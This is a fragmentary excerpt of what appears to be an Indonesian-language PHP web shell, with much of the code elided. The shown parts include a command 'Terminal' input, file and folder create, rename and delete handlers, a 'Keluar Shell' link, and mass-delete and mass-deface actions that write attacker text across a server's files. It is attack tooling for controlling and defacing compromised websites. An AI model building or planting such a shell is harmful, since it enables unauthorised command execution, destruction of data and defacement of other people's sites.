...
.html(filenames.join(","));
		...
		echo '
		<div class="container">
				              <img height=80 width=350 src="https://pub-3d6adab3eee64200af327d18373a7f35.r2.dev/seo.png"></img>
			<hr/>
			<div class="text-center">
				<div class="d-flex justify-content-center flex-wrap">
					...
					<a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> Keluar Shell</a>
				</div>
			</div>
			<hr>
				...
				<div class="col-lg-4"><br/>
					<h5>Terminal : </h5>
					<form>
						<input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="Ex: id / uname-a / whoami / dan lainya...">
					</form>
		...
		if ($_GET['aksi'] == 'buat_file') {
			...
			<form method='POST'>
				...
				<button type='sumbit' class='btn btn-info btn-block' name='bikin'>Buat File</button><br/>
			</form>";
			echo $output;
		...
		*/
		if($_GET['aksi'] == 'rename') {
			...
			if(isset($_POST['rename_file'])) {
				...
				rename( $baru, $lama);
				if(file_exists($baru)) {
					echo '<script>alert("Nama '.$baru.' Sudah Ada Di Folder");</script>';
				}else{
					if(rename( $lama, $baru)) {
						echo '<script>window.location="?dir='.$dir.'"; alert("Sukses Gantu Nama Menjadi '.$baru.'");</script>';
					}else{
		...
		*/
		if ($_GET['aksi'] == 'hapusf') {
			...
			<div class='card card-body'>
				<center><br/>
					<font color='black'> Menghapus : $nama</font>
				</center><br/><br/>
				<form method='POST'>
		...
		*/
		if ($_GET['aksi'] == 'buat_folder' ) {
			...
			<form method='POST'>
				...
				<button type='sumbit' class='btn btn-info btn-block' name='buat'>Buat Folder</button>
			</form>";
			echo $output;
		...
		*/
		if ($_GET['aksi'] == 'hapus_folder' ) {
			...
			<div class='card container'>
				<center><br/>
					<font color='black'> Menghapus : $nama ?
				</center><br/><br/>
				<form method='POST'>
		...
		*/
		if ($_GET['aksi'] == 'rename_folder' ) {
			...
			<form method='POST'>
				<input type='text' class='form-control' name='namanew' autocomplete='off' placeholder='Masukan Nama Baru...'><br/>
				<button type='sumbit' class='btn btn-info btn-block' name='ganti'>Ganti Folder</button><br/>
			</form>";
			echo $output;
		...
		*/
		if($_GET['aksi'] == 'masdel') {
			...
			if($_POST['start']) {
				...
				echo "<form method='post'>
					<h5><i class='fa fa-folder'></i> Lokasi File :</h5>
	...
	if($_GET['aksi'] == 'masdef') {
		...
		echo "</textarea><br/>";
			...
			echo "<form method='post'>
				...
				<textarea name='script' class='form-control' rows='5' autocomplete='off' placeholder='[Ex] Hunter Ganteng'></textarea><br/>
				<input type='submit' name='start' value='Mass File Folder' class='btn btn-danger form-control'><br/>
			</form>";
		}
		exit;
	}
